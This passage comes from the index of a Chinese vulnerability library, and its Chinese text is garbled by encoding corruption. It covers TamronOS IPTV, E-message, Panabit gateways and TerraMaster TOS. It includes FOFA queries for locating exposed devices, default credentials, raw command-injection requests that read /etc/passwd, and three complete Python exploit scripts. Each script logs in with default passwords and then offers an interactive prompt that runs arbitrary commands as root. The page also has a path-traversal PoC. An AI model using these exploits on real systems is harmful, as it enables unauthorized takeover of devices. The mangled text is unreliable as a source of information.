Â≠òÂú®‰ªªÊÑèÂëΩ‰ª§ÊâßË°åÊºèÊ¥ûÔºåÊîªÂáªËÄÖÈÄöËøáÊºèÊ¥ûÂèØ‰ª•ÊâßË°å‰ªªÊÑèÂëΩ‰ª§ ÊºèÊ¥ûÂΩ±Âìç [!NOTE] TamronOS IPTVÁ≥ªÁªü FOFA [!NOTE] app=\"TamronOS-IPTVÁ≥ªÁªü\" ÊºèÊ¥ûÂ§çÁé∞ ÁôªÂΩïÈ°µÈù¢Â¶Ç‰∏ã ÊºèÊ¥ûPOC‰∏∫ /api/ping?count=5&host=;id; Á®ªËçâ‰∫∫ÂÆâÂÖ®ÊºèÊ¥ûÂ∫ì all right reservedÔºåpowered by GitbookÊñá‰ª∂Êõ¥Êñ∞Êó∂Èó¥Ôºö 2021-07-21 13:48:08 "},"book/WebÂ∫îÁî®ÊºèÊ¥û/E-message/":{"url":"book/WebÂ∫îÁî®ÊºèÊ¥û/E-message/","title":"E-message","keywords":"","body":"E-message E-message Ë∂äÊùÉËÆøÈóÆÊºèÊ¥û Á®ªËçâ‰∫∫ÂÆâÂÖ®ÊºèÊ¥ûÂ∫ì all right reservedÔºåpowered by GitbookÊñá‰ª∂Êõ¥Êñ∞Êó∂Èó¥Ôºö 2021-07-21 13:48:08 "},"book/WebÂ∫îÁî®ÊºèÊ¥û/E-message/E-message Ë∂äÊùÉËÆøÈóÆÊºèÊ¥û.html":{"url":"book/WebÂ∫îÁî®ÊºèÊ¥û/E-message/E-message Ë∂äÊùÉËÆøÈóÆÊºèÊ¥û.html","title":"E-message Ë∂äÊùÉËÆøÈóÆÊºèÊ¥û","keywords":"","body":"E-message Ë∂äÊùÉËÆøÈóÆÊºèÊ¥û ÊºèÊ¥ûÊèèËø∞ E-message Â≠òÂú®Ë∂äÊùÉËÆøÈóÆÊºèÊ¥ûÔºåÁî±‰∫éÈÖçÁΩÆÈ°µÈù¢Ê≤°ÊúâÂÅöÊùÉÈôêËÆæÂÆöÔºåÂØºËá¥ÊîªÂáªËÄÖÂèØ‰ª•ËÆøÈóÆÂπ∂ÈáçÁΩÆË¥¶Âè∑ÂØÜÁ†ÅÁ≠âÊìç‰Ωú ÊºèÊ¥ûÂΩ±Âìç [!NOTE] E-message FOFA [!NOTE] title=\"emessage ËÆæÁΩÆ: Êï∞ÊçÆÂ∫ìËÆæÁΩÆ - Ê†áÂáÜËøûÊé•\" ÊºèÊ¥ûÂ§çÁé∞ ËÆøÈóÆÂÆâË£ÖÈ°µÈù¢ http://xxx.xxx.xxx.xxx/setup/setup-datasource-standard.jsp ÂèØ‰ª•Ëé∑ÂèñË¥¶Âè∑ÂØÜÁ†Å‰ø°ÊÅØÔºå‰∏ÄË∑ØÁÇπÂáªÂè≥‰∏ãËßíÁöÑÁªßÁª≠Â∞Ü‰ºöË∑≥ËΩ¨‰øÆÊîπÁÆ°ÁêÜÂëòË¥¶Âè∑ÂØÜÁ†ÅÈ°µÈù¢Ôºå‰øÆÊîπÂêéÁôªÂΩïÂç≥ÂèØËé∑ÂèñÂêéÂè∞ÊùÉÈôê Á®ªËçâ‰∫∫ÂÆâÂÖ®ÊºèÊ¥ûÂ∫ì all right reservedÔºåpowered by GitbookÊñá‰ª∂Êõ¥Êñ∞Êó∂Èó¥Ôºö 2021-07-21 13:48:08 "},"book/WebÂ∫îÁî®ÊºèÊ¥û/Panabit/":{"url":"book/WebÂ∫îÁî®ÊºèÊ¥û/Panabit/","title":"Panabit","keywords":"","body":"Panabit Panabit iXCache cfg_cmd ÂêéÂè∞ÂëΩ‰ª§ÊâßË°åÊºèÊ¥û Panabit Panalog cmdhandle.php ÂêéÂè∞ÂëΩ‰ª§ÊâßË°åÊºèÊ¥û Á®ªËçâ‰∫∫ÂÆâÂÖ®ÊºèÊ¥ûÂ∫ì all right reservedÔºåpowered by GitbookÊñá‰ª∂Êõ¥Êñ∞Êó∂Èó¥Ôºö 2021-07-21 13:48:08 "},"book/WebÂ∫îÁî®ÊºèÊ¥û/Panabit/Panabit iXCache cfg_cmd ÂêéÂè∞ÂëΩ‰ª§ÊâßË°åÊºèÊ¥û.html":{"url":"book/WebÂ∫îÁî®ÊºèÊ¥û/Panabit/Panabit iXCache cfg_cmd ÂêéÂè∞ÂëΩ‰ª§ÊâßË°åÊºèÊ¥û.html","title":"Panabit iXCache cfg_cmd ÂêéÂè∞ÂëΩ‰ª§ÊâßË°åÊºèÊ¥û","keywords":"","body":"Panabit iXCache ajax_cmd ÂêéÂè∞ÂëΩ‰ª§ÊâßË°åÊºèÊ¥û ÊºèÊ¥ûÊèèËø∞ Panabit iXCache ÂêéÂè∞ ixeyeÊåá‰ª§ËæìÂÖ•Êó∂Â≠òÂú®ÂëΩ‰ª§ÊãºÊé•ÊºèÊ¥ûÔºåÂ∞Ü‰ºö‰ª•RootÊùÉÈôêÊâßË°å‰ªªÊÑè‰ª£Á†Å ÊºèÊ¥ûÂΩ±Âìç [!NOTE] Panabit iXCache FOFA [!NOTE] \"iXCache\" ÊºèÊ¥ûÂ§çÁé∞ ÁôªÂΩïÈ°µÈù¢Â¶Ç‰∏ã ÈªòËÆ§Ë¥¶Âè∑ÂØÜÁ†Å‰∏∫Ôºöadmin/ixcache ËøõÂÖ•ÂêéÂè∞ÂêéÁÇπÂáªÂëΩ‰ª§Ë°åÔºåËÆøÈóÆUrl /cgi-bin/Maintain/cfg_cmd ËæìÂÖ•ÂëΩ‰ª§Êó∂‰ΩøÁî® ; Âç≥ÂèØÂëΩ‰ª§ÊãºÊé•ÊâßË°å‰ªªÊÑèÂëΩ‰ª§ ËØ∑Ê±ÇÂåÖ‰∏∫ POST /cgi-bin/Maintain/ajax_cmd?action=runcmd&cmd=ixeye%20;cat%20/etc/passwd HTTP/1.1 Host: Connection: close Content-Length: 0 sec-ch-ua: \" Not A;Brand\";v=\"99\", \"Chromium\";v=\"90\", \"Google Chrome\";v=\"90\" Accept: */* X-Requested-With: XMLHttpRequest sec-ch-ua-mobile: ?0 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36 Sec-Fetch-Site: same-origin Sec-Fetch-Mode: cors Sec-Fetch-Dest: empty Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7,zh-TW;q=0.6 Cookie: _walkthrough-introduction=0; pauser_1615540522_368691=paonline_admin_73708_16196903931;Path=/ ÊºèÊ¥ûPOC import requests import sys import random import re import base64 import time from requests.packages.urllib3.exceptions import InsecureRequestWarning def title(): print('+------------------------------------------') print('+ \\033[34mPOC_Des: http://wiki.peiqi.tech \\033[0m') print('+ \\033[34mGithub : https://github.com/PeiQi0 \\033[0m') print('+ \\033[34mÂÖ¨‰ºóÂè∑ : PeiQiÊñáÂ∫ì \\033[0m') print('+ \\033[34mTitle : Panabit iXCache cfg_cmd ÂêéÂè∞ÂëΩ‰ª§ÊâßË°åÊºèÊ¥û \\033[0m') print('+ \\033[36m‰ΩøÁî®Ê†ºÂºè: python3 poc.py \\033[0m') print('+ \\033[36mUrl >>> http://xxx.xxx.xxx.xxx \\033[0m') print('+------------------------------------------') def POC_1(target_url): vuln_url = target_url + \"/login/userverify.cgi\" headers = { \"Content-Type\": \"application/x-www-form-urlencoded\", } data = \"username=admin&password=ixcache\" try: requests.packages.urllib3.disable_warnings(InsecureRequestWarning) response = requests.post(url=vuln_url, headers=headers,data=data, verify=False, timeout=5) print(\"\\033[36m[o] Ê≠£Âú®ËØ∑Ê±Ç {}/login/userverify.cgi.... \\033[0m\".format(target_url)) if '/cgi-bin/monitor.cgi' in response.text and response.status_code == 200: print(\"\\033[32m[o] ÁõÆÊ†á {} Â≠òÂú®ÈªòËÆ§Âè£‰ª§ admin/ixcache \\033[0m\".format(target_url)) cookie = response.headers['Set-Cookie'] print(\"\\033[36m[o] Ëé∑ÂèñCookie : {} \\033[0m\".format(cookie)) POC_2(target_url, cookie) else: print(\"\\033[31m[x] ËØ∑Ê±ÇÂ§±Ë¥• \\033[0m\") sys.exit(0) except Exception as e: print(\"\\033[31m[x] ËØ∑Ê±ÇÂ§±Ë¥• \\033[0m\", e) def POC_2(target_url, Cookie): vuln_url = target_url + \"/cgi-bin/Maintain/ajax_cmd?action=runcmd&cmd=ixeye%20;cat%20/etc/passwd\" headers = { \"Content-Type\": \"application/x-www-form-urlencoded\", \"Cookie\": \"_walkthrough-introduction=0;{}\".format(Cookie) } try: requests.packages.urllib3.disable_warnings(InsecureRequestWarning) response = requests.post(url=vuln_url, headers=headers, verify=False, timeout=5) if 'root' in response.text and response.status_code == 200: print(\"\\033[32m[o] ÁõÆÊ†á {}Â≠òÂú®ÊºèÊ¥û ,ÊâßË°å cat /etc/passwd \\033[0m\".format(target_url)) print(\"\\033[36m[o] ÂìçÂ∫î‰∏∫:\\n{} \\033[0m\".format(response.text)) while True: Cmd = input(\"\\033[35mCmd >>> \\033[0m\") if Cmd == \"exit\": sys.exit(0) else: POC_3(target_url, Cmd, Cookie) except Exception as e: print(\"\\033[31m[x] ËØ∑Ê±ÇÂ§±Ë¥• \\033[0m\", e) def POC_3(target_url, Cmd, Cookie): Cmd = Cmd.replace(\" \", \"%20\") vuln_url = target_url + \"/cgi-bin/Maintain/ajax_cmd?action=runcmd&cmd=ixeye%20;{}\".format(Cmd) headers = { \"Content-Type\": \"application/x-www-form-urlencoded\", \"Cookie\": \"_walkthrough-introduction=0;{}\".format(Cookie) } try: requests.packages.urllib3.disable_warnings(InsecureRequestWarning) response = requests.post(url=vuln_url, headers=headers, verify=False, timeout=5) print(\"\\033[36m[o] ÂìçÂ∫î‰∏∫:\\n{} \\033[0m\".format(response.text)) except Exception as e: print(\"\\033[31m[x] ËØ∑Ê±ÇÂ§±Ë¥• \\033[0m\", e) if __name__ == '__main__': title() target_url = str(input(\"\\033[35mPlease input Attack Url\\nUrl >>> \\033[0m\")) POC_1(target_url) Á®ªËçâ‰∫∫ÂÆâÂÖ®ÊºèÊ¥ûÂ∫ì all right reservedÔºåpowered by GitbookÊñá‰ª∂Êõ¥Êñ∞Êó∂Èó¥Ôºö 2021-07-21 13:48:08 "},"book/WebÂ∫îÁî®ÊºèÊ¥û/Panabit/Panabit Panalog cmdhandle.php ÂêéÂè∞ÂëΩ‰ª§ÊâßË°åÊºèÊ¥û.html":{"url":"book/WebÂ∫îÁî®ÊºèÊ¥û/Panabit/Panabit Panalog cmdhandle.php ÂêéÂè∞ÂëΩ‰ª§ÊâßË°åÊºèÊ¥û.html","title":"PPanabit Panalog cmdhandle.php ÂêéÂè∞ÂëΩ‰ª§ÊâßË°åÊºèÊ¥û","keywords":"","body":"Panabit Panalog cmdhandle.php ÂêéÂè∞ÂëΩ‰ª§ÊâßË°åÊºèÊ¥û ÊºèÊ¥ûÊèèËø∞ Panabit Panalog cmdhandle.php Â≠òÂú®ÂêéÂè∞ÂëΩ‰ª§ÊâßË°åÊºèÊ¥ûÔºåÊîªÂáªËÄÖÂèØ‰ª•ÁôªÂΩïÂêéÊâßË°å‰ªªÊÑèÂëΩ‰ª§ÊéßÂà∂ÊúçÂä°Âô® ÊºèÊ¥ûÂΩ±Âìç [!NOTE] Panabit Panalog FOFA [!NOTE] \"Panalog\" ÊºèÊ¥ûÂ§çÁé∞ ÁôªÂΩïÈ°µÈù¢Â¶Ç‰∏ã ÈªòËÆ§Ë¥¶Âè∑ÂØÜÁ†Å‰∏∫Ôºöadmin/panabit Âá∫Áé∞ÊºèÊ¥ûÁöÑÊñá‰ª∂‰∏∫ Maintain/command-html.phpÔºå ËØ∑Ê±ÇÂåÖÂ¶Ç‰∏ã POST /Maintain/cmdhandle.php HTTP/1.1 Host: Connection: close Content-Length: 31 sec-ch-ua: \" Not A;Brand\";v=\"99\", \"Chromium\";v=\"90\", \"Google Chrome\";v=\"90\" Accept: */* X-Requested-With: XMLHttpRequest sec-ch-ua-mobile: ?0 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36 Content-Type: application/x-www-form-urlencoded; charset=UTF-8 Sec-Fetch-Site: same-origin Sec-Fetch-Mode: cors Sec-Fetch-Dest: empty Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7,zh-TW;q=0.6 Cookie: cloud_limit=20; cloud_left=block; PHPSESSID=9lpglosgab794j5ouvv0sg7q73 cmd=cat%2520%252Fetc%252Fpasswd ÊºèÊ¥ûPOC import requests import sys import random import re import base64 import time from requests.packages.urllib3.exceptions import InsecureRequestWarning def title(): print('+------------------------------------------') print('+ \\033[34mPOC_Des: http://wiki.peiqi.tech \\033[0m') print('+ \\033[34mGithub : https://github.com/PeiQi0 \\033[0m') print('+ \\033[34mÂÖ¨‰ºóÂè∑ : PeiQiÊñáÂ∫ì \\033[0m') print('+ \\033[34mTitle : Panabit Panalog cmdhandle.php ÂêéÂè∞ÂëΩ‰ª§ÊâßË°åÊºèÊ¥û \\033[0m') print('+ \\033[36m‰ΩøÁî®Ê†ºÂºè: python3 poc.py \\033[0m') print('+ \\033[36mUrl >>> http://xxx.xxx.xxx.xxx \\033[0m') print('+------------------------------------------') def POC_1(target_url): vuln_url = target_url + \"/login.php\" cookie = \"PHPSESSID=111111111111111111111peiqi\" headers = { \"Content-Type\": \"application/x-www-form-urlencoded\", \"Cookie\": cookie } data = \"user=admin&mypass=panabit&sec=1619123700835.617&useldap=0\" try: requests.packages.urllib3.disable_warnings(InsecureRequestWarning) response = requests.post(url=vuln_url, headers=headers,data=data, verify=False, timeout=5) print(\"\\033[36m[o] Ê≠£Âú®ËØ∑Ê±Ç {}/login.php.... \\033[0m\".format(target_url)) if \"yes\" in response.text and \"yn\" in response.text and response.status_code == 200: print(\"\\033[32m[o] ÁõÆÊ†á {} Â≠òÂú®ÈªòËÆ§Âè£‰ª§ admin/panabit \\033[0m\".format(target_url)) print(\"\\033[36m[o] ËÆæÁΩÆCookie : {} \\033[0m\".format(cookie)) POC_2(target_url, cookie) else: print(\"\\033[31m[x] ËØ∑Ê±ÇÂ§±Ë¥• \\033[0m\") sys.exit(0) except Exception as e: print(\"\\033[31m[x] ËØ∑Ê±ÇÂ§±Ë¥• \\033[0m\", e) def POC_2(target_url, Cookie): vuln_url = target_url + \"/Maintain/cmdhandle.php\" headers = { \"Content-Type\": \"application/x-www-form-urlencoded\", \"Cookie\": \"{}\".format(Cookie) } data = \"cmd=cat /etc/passwd\" try: requests.packages.urllib3.disable_warnings(InsecureRequestWarning) response = requests.post(url=vuln_url,data=data, headers=headers, verify=False, timeout=5) if 'root' in response.text and response.status_code == 200: print(\"\\033[32m[o] ÁõÆÊ†á {}Â≠òÂú®ÊºèÊ¥û ,ÊâßË°å cat /etc/passwd \\033[0m\".format(target_url)) print(\"\\033[36m[o] ÂìçÂ∫î‰∏∫:\\n{} \\033[0m\".format(response.text)) while True: Cmd = input(\"\\033[35mCmd >>> \\033[0m\") if Cmd == \"exit\": sys.exit(0) else: POC_3(target_url, Cmd, Cookie) except Exception as e: print(\"\\033[31m[x] ËØ∑Ê±ÇÂ§±Ë¥• \\033[0m\", e) def POC_3(target_url, Cmd, Cookie): Cmd = Cmd.replace(\" \", \"%20\") vuln_url = target_url + \"/Maintain/cmdhandle.php\" headers = { \"Content-Type\": \"application/x-www-form-urlencoded\", \"Cookie\": \"{}\".format(Cookie) } data = \"cmd={}\".format(Cmd) try: requests.packages.urllib3.disable_warnings(InsecureRequestWarning) response = requests.post(url=vuln_url, data=data,headers=headers, verify=False, timeout=5) response_data = response.text.replace(\"\", \"\\n\") print(\"\\033[36m[o] ÂìçÂ∫î‰∏∫:\\n{} \\033[0m\".format(response_data)) except Exception as e: print(\"\\033[31m[x] ËØ∑Ê±ÇÂ§±Ë¥• \\033[0m\", e) if __name__ == '__main__': title() target_url = str(input(\"\\033[35mPlease input Attack Url\\nUrl >>> \\033[0m\")) POC_1(target_url) Á®ªËçâ‰∫∫ÂÆâÂÖ®ÊºèÊ¥ûÂ∫ì all right reservedÔºåpowered by GitbookÊñá‰ª∂Êõ¥Êñ∞Êó∂Èó¥Ôºö 2021-07-21 13:48:08 "},"book/WebÂ∫îÁî®ÊºèÊ¥û/Panabit/Panabit Êô∫ËÉΩÂ∫îÁî®ÁΩëÂÖ≥ ajax_top ÂêéÂè∞ÂëΩ‰ª§ÊâßË°åÊºèÊ¥û.html":{"url":"book/WebÂ∫îÁî®ÊºèÊ¥û/Panabit/Panabit Êô∫ËÉΩÂ∫îÁî®ÁΩëÂÖ≥ ajax_top ÂêéÂè∞ÂëΩ‰ª§ÊâßË°åÊºèÊ¥û.html","title":"Panabit Êô∫ËÉΩÂ∫îÁî®ÁΩëÂÖ≥ ajax_top ÂêéÂè∞ÂëΩ‰ª§ÊâßË°åÊºèÊ¥û","keywords":"","body":"Panabit Êô∫ËÉΩÂ∫îÁî®ÁΩëÂÖ≥ ajax_top ÂêéÂè∞ÂëΩ‰ª§ÊâßË°åÊºèÊ¥û ÊºèÊ¥ûÊèèËø∞ Panabit Êô∫ËÉΩÂ∫îÁî®ÁΩëÂÖ≥ ajax_top ÂêéÂè∞Â≠òÂú®ÂëΩ‰ª§ÊâßË°åÊºèÊ¥ûÔºåÊîªÂáªËÄÖÂèØ‰ª•‰ª•rootÊùÉÈôêËøêË°åÈÉ®ÂàÜÂç±Èô©ÂëΩ‰ª§ ÊºèÊ¥ûÂΩ±Âìç [!NOTE] Panabit Êô∫ËÉΩÂ∫îÁî®ÁΩëÂÖ≥ FOFA [!NOTE] cert=\"panabit.com\" && body=\"/login/login.js\" ÊºèÊ¥ûÂ§çÁé∞ ÁôªÂΩïÈ°µÈù¢Â¶Ç‰∏ã ÈªòËÆ§Ë¥¶Âè∑ÂØÜÁ†Å‰∏∫Ôºöadmin/panabit Âá∫Áé∞ÊºèÊ¥ûÁöÑÊñá‰ª∂‰∏∫ /cgi-bin/Maintain/ajax_topÔºå ËØ∑Ê±ÇÂåÖÂ¶Ç‰∏ã POST /cgi-bin/Maintain/ajax_top?action=runcmd&cmd=ls HTTP/1.1 Host: Connection: close Content-Length: 0 sec-ch-ua: \" Not A;Brand\";v=\"99\", \"Chromium\";v=\"90\", \"Google Chrome\";v=\"90\" Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Cache-Control: no-cache Accept-Language: zh-CN,zh;q=0.8 sec-ch-ua-mobile: ?0 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36 Content-Type: text/html; charset=GB2312 Sec-Fetch-Site: same-origin Sec-Fetch-Mode: cors Sec-Fetch-Dest: empty Accept-Encoding: gzip, deflate Cookie: pauser_1618744108=paonline_admin_9328_16197064781_c4229a3a492c76e334f57728abced88b|443|; ÊºèÊ¥ûPOC import requests import sys import random import re import base64 import time from requests.packages.urllib3.exceptions import InsecureRequestWarning def title(): print('+------------------------------------------') print('+ \\033[34mPOC_Des: http://wiki.peiqi.tech \\033[0m') print('+ \\033[34mGithub : https://github.com/PeiQi0 \\033[0m') print('+ \\033[34mÂÖ¨‰ºóÂè∑ : PeiQiÊñáÂ∫ì \\033[0m') print('+ \\033[34mTitle : Panabit Êô∫ËÉΩÂ∫îÁî®ÁΩëÂÖ≥ ajax_top ÂêéÂè∞ÂëΩ‰ª§ÊâßË°åÊºèÊ¥û \\033[0m') print('+ \\033[36m‰ΩøÁî®Ê†ºÂºè: python3 poc.py \\033[0m') print('+ \\033[36mUrl >>> http://xxx.xxx.xxx.xxx \\033[0m') print('+------------------------------------------') def POC_1(target_url): vuln_url = target_url + \"/login/userverify.cgi\" headers = { \"Content-Type\": \"application/x-www-form-urlencoded\", } data = \"action=user_login&palang=ch&username=admin&password=722289d072731e2cc73038aa9ad9e067&code=\" try: requests.packages.urllib3.disable_warnings(InsecureRequestWarning) response = requests.post(url=vuln_url, headers=headers,data=data, verify=False, timeout=5) print(\"\\033[36m[o] Ê≠£Âú®ËØ∑Ê±Ç {}/login/userverify.cgi.... \\033[0m\".format(target_url)) if \"Auth_OK\" in response.text and response.status_code == 200: print(\"\\033[32m[o] ÁõÆÊ†á {} Â≠òÂú®ÈªòËÆ§Âè£‰ª§ admin/panabit \\033[0m\".format(target_url)) cookie = response.headers['Set-Cookie'] print(\"\\033[36m[o] Ëé∑ÂèñCookie : {} \\033[0m\".format(cookie)) POC_2(target_url, cookie) else: print(\"\\033[31m[x] ËØ∑Ê±ÇÂ§±Ë¥• \\033[0m\") sys.exit(0) except Exception as e: print(\"\\033[31m[x] ËØ∑Ê±ÇÂ§±Ë¥• \\033[0m\", e) def POC_2(target_url, Cookie): vuln_url = target_url + \"/cgi-bin/Maintain/ajax_top?action=runcmd&cmd=cat /etc/passwd\" headers = { \"Content-Type\": \"application/x-www-form-urlencoded\", \"Cookie\": \"{}\".format(Cookie) } try: requests.packages.urllib3.disable_warnings(InsecureRequestWarning) response = requests.post(url=vuln_url, headers=headers, verify=False, timeout=5) if 'root' in response.text and response.status_code == 200: print(\"\\033[32m[o] ÁõÆÊ†á {}Â≠òÂú®ÊºèÊ¥û ,ÊâßË°å cat /etc/passwd \\033[0m\".format(target_url)) print(\"\\033[36m[o] ÂìçÂ∫î‰∏∫:\\n{} \\033[0m\".format(response.text)) while True: Cmd = input(\"\\033[35mCmd >>> \\033[0m\") if Cmd == \"exit\": sys.exit(0) else: POC_3(target_url, Cmd, Cookie) except Exception as e: print(\"\\033[31m[x] ËØ∑Ê±ÇÂ§±Ë¥• \\033[0m\", e) def POC_3(target_url, Cmd, Cookie): vuln_url = target_url + \"/cgi-bin/Maintain/ajax_top?action=runcmd&cmd={}\".format(Cmd) headers = { \"Content-Type\": \"application/x-www-form-urlencoded\", \"Cookie\": \"{}\".format(Cookie) } try: requests.packages.urllib3.disable_warnings(InsecureRequestWarning) response = requests.post(url=vuln_url ,headers=headers, verify=False, timeout=5) response_data = response.text.replace(\"\", \"\\n\") print(\"\\033[36m[o] ÂìçÂ∫î‰∏∫:\\n{} \\033[0m\".format(response_data)) except Exception as e: print(\"\\033[31m[x] ËØ∑Ê±ÇÂ§±Ë¥• \\033[0m\", e) if __name__ == '__main__': title() target_url = str(input(\"\\033[35mPlease input Attack Url\\nUrl >>> \\033[0m\")) POC_1(target_url) Á®ªËçâ‰∫∫ÂÆâÂÖ®ÊºèÊ¥ûÂ∫ì all right reservedÔºåpowered by GitbookÊñá‰ª∂Êõ¥Êñ∞Êó∂Èó¥Ôºö 2021-07-21 13:48:08 "},"book/WebÂ∫îÁî®ÊºèÊ¥û/TerraMaster/":{"url":"book/WebÂ∫îÁî®ÊºèÊ¥û/TerraMaster/","title":"TerraMaster","keywords":"","body":"TerraMaster TerraMaster TOS RCE CVE-2020-28188 TerraMaster TOS ‰ªªÊÑèÊñá‰ª∂ËØªÂèñÊºèÊ¥û CVE-2020-28187 TerraMaster TOS ‰ªªÊÑèË¥¶Âè∑ÂØÜÁ†Å‰øÆÊîπÊºèÊ¥û CVE-2020-28186 TerraMaster TOS Áî®Êà∑Êûö‰∏æÊºèÊ¥û CVE-2020-28185 TerraMaster TOS exportUser.php ËøúÁ®ãÂëΩ‰ª§ÊâßË°å Á®ªËçâ‰∫∫ÂÆâÂÖ®ÊºèÊ¥ûÂ∫ì all right reservedÔºåpowered by GitbookÊñá‰ª∂Êõ¥Êñ∞Êó∂Èó¥Ôºö 2021-07-21 13:48:08 "},"book/WebÂ∫îÁî®ÊºèÊ¥û/TerraMaster/TerraMaster TOS exportUser.php ËøúÁ®ãÂëΩ‰ª§ÊâßË°å CVE-2020-15568.html":{"url":"book/WebÂ∫îÁî®ÊºèÊ¥û/TerraMaster/TerraMaster TOS exportUser.php ËøúÁ®ãÂëΩ‰ª§ÊâßË°å CVE-2020-15568.html","title":"TerraMaster TOS exportUser.php ËøúÁ®ãÂëΩ‰ª§ÊâßË°å CVE-2020-15568","keywords":"","body":"TerraMaster TOS exportUser.php ËøúÁ®ãÂëΩ‰ª§ÊâßË°å CVE-2020-15568 Á®ªËçâ‰∫∫ÂÆâÂÖ®ÊºèÊ¥ûÂ∫ì all right reservedÔºåpowered by GitbookÊñá‰ª∂Êõ¥Êñ∞Êó∂Èó¥Ôºö 2021-07-21 13:50:07 "},"book/WebÂ∫îÁî®ÊºèÊ¥û/TerraMaster/TerraMaster TOS Áî®Êà∑Êûö‰∏æÊºèÊ¥û CVE-2020-28185.html":{"url":"book/WebÂ∫îÁî®ÊºèÊ¥û/TerraMaster/TerraMaster TOS Áî®Êà∑Êûö‰∏æÊºèÊ¥û CVE-2020-28185.html","title":"TerraMaster TOS Áî®Êà∑Êûö‰∏æÊºèÊ¥û CVE-2020-28185","keywords":"","body":"TerraMaster TOS Áî®Êà∑Êûö‰∏æÊºèÊ¥û CVE-2020-28185 ÊºèÊ¥ûÊèèËø∞ TerraMaster TOS Â≠òÂú®Áî®Êà∑Êûö‰∏æÊºèÊ¥ûÔºåÈÄöËøáwizard/initialise.phpÈ°µÈù¢ÁöÑusernameÂèÇÊï∞Âç≥ÂèØÊûö‰∏æÁ≥ªÁªü‰∏≠ÁöÑÁî®Êà∑Ôºå‰ª•ÂèäÊ≥ÑÈú≤ÈÇÆÁÆ±‰ø°ÊÅØ ÊºèÊ¥ûÂΩ±Âìç [!NOTE] TerraMaster TOS FOFA [!NOTE] \"TerraMaster\" && header=\"TOS\" ÊºèÊ¥ûÂ§çÁé∞ ÊºèÊ¥ûÁÇπÊù•Ê∫ê‰∫éÊâæÂõûÂØÜÁ†ÅÁöÑÁî®Êà∑Â≠òÂú®Ê†°È™å ËæìÂÖ•Áî®Êà∑Âêç admin ÁÇπÂáªÁ°ÆÂÆöÔºåÊü•ÁúãBurpÊçïËé∑ÁöÑÂåÖ ÂÖ∂‰∏≠Êúâ‰∏Ä‰∏™ËØ∑Ê±ÇÂåÖÁî®‰∫éÁ°ÆËÆ§Áî®Êà∑adminÊòØÂê¶Â≠òÂú® Â≠òÂú®ÂàôËøîÂõûÁî®Êà∑ÁöÑÈÇÆÁÆ±‰ø°ÊÅØ Á®ªËçâ‰∫∫ÂÆâÂÖ®ÊºèÊ¥ûÂ∫ì all right reservedÔºåpowered by GitbookÊñá‰ª∂Êõ¥Êñ∞Êó∂Èó¥Ôºö 2021-07-21 13:48:08 "},"book/WebÂ∫îÁî®ÊºèÊ¥û/TerraMaster/TerraMaster TOS ‰ªªÊÑèË¥¶Âè∑ÂØÜÁ†Å‰øÆÊîπÊºèÊ¥û CVE-2020-28186.html":{"url":"book/WebÂ∫îÁî®ÊºèÊ¥û/TerraMaster/TerraMaster TOS ‰ªªÊÑèË¥¶Âè∑ÂØÜÁ†Å‰øÆÊîπÊºèÊ¥û CVE-2020-28186.html","title":"TerraMaster TOS ‰ªªÊÑèË¥¶Âè∑ÂØÜÁ†Å‰øÆÊîπÊºèÊ¥û CVE-2020-28186","keywords":"","body":"TerraMaster TOS ‰ªªÊÑèË¥¶Âè∑ÂØÜÁ†Å‰øÆÊîπÊºèÊ¥û CVE-2020-28186 ÊºèÊ¥ûÊèèËø∞ TerraMaster TOS ÊºèÊ¥ûÂΩ±Âìç [!NOTE] TerraMaster TOS FOFA [!NOTE] \"TerraMaster\" && header=\"TOS\" ÊºèÊ¥ûÂ§çÁé∞ È¶ñÂÖàÈúÄË¶ÅÁü•ÈÅìÂ∑≤Áü•Áî®Êà∑ÂêçÔºåÂèØ‰ª•ÂèÇËÄÉ TerraMaster TOS Áî®Êà∑Êûö‰∏æÊºèÊ¥û CVE-2020-28185 Ëé∑ÂèñÂ∑≤Áü•ÁöÑÁî®Êà∑Âêç ÈáçÁΩÆÈ°µÈù¢ËæìÂÖ•Ëé∑ÂèñÁöÑË¥¶Âè∑ÂíåÈÇÆÁÆ± ÁÇπÂáªÁ°ÆÂÆöÔºåÊäìÂåÖÊõ¥Êç¢ÈÇÆÁÆ±Êé•Êî∂È™åËØÅÁ†Å ÈÄöËøáÊé•Êî∂ÁöÑÈ™åËØÅÁ†ÅÂç≥ÂèØÊõ¥Êç¢Ë¥¶Âè∑ÂØÜÁ†ÅÁôªÂΩïÂêéÂè∞ Á®ªËçâ‰∫∫ÂÆâÂÖ®ÊºèÊ¥ûÂ∫ì all right reservedÔºåpowered by GitbookÊñá‰ª∂Êõ¥Êñ∞Êó∂Èó¥Ôºö 2021-07-21 13:48:08 "},"book/WebÂ∫îÁî®ÊºèÊ¥û/TerraMaster/TerraMaster TOS ÂêéÂè∞‰ªªÊÑèÊñá‰ª∂ËØªÂèñÊºèÊ¥û CVE-2020-28187.html":{"url":"book/WebÂ∫îÁî®ÊºèÊ¥û/TerraMaster/TerraMaster TOS ÂêéÂè∞‰ªªÊÑèÊñá‰ª∂ËØªÂèñÊºèÊ¥û CVE-2020-28187.html","title":"TerraMaster TOS ÂêéÂè∞‰ªªÊÑèÊñá‰ª∂ËØªÂèñÊºèÊ¥û CVE-2020-28187","keywords":"","body":"TerraMaster TOS ÂêéÂè∞‰ªªÊÑèÊñá‰ª∂ËØªÂèñÊºèÊ¥û CVE-2020-28187 ÊºèÊ¥ûÊèèËø∞ TerraMaster TOS ÊºèÊ¥ûÂΩ±Âìç [!NOTE] TerraMaster TOS FOFA [!NOTE] \"TerraMaster\" && header=\"TOS\" ÊºèÊ¥ûÂ§çÁé∞ ÁôªÈôÜÂêéËÆøÈóÆÔºåÈ™åËØÅÊºèÊ¥ûÁöÑPOC‰∏∫ /tos/index.php?editor/fileGet&filename=../../../../../../etc/passwd 